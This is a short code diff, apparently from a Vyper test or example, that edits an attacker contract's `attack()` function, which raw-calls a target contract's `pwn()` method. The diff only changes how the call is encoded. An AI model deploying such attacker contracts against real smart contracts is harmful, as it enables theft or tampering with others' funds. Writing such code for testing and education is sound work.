@@ -30,4 +30,4 @@ def __init__(_hackMe: address):
 
 @external
 def attack():
-    raw_call(self.hackMe, _abi_encode(method_id=method_id("pwn()")))
+    raw_call(self.hackMe, method_id("pwn()"))
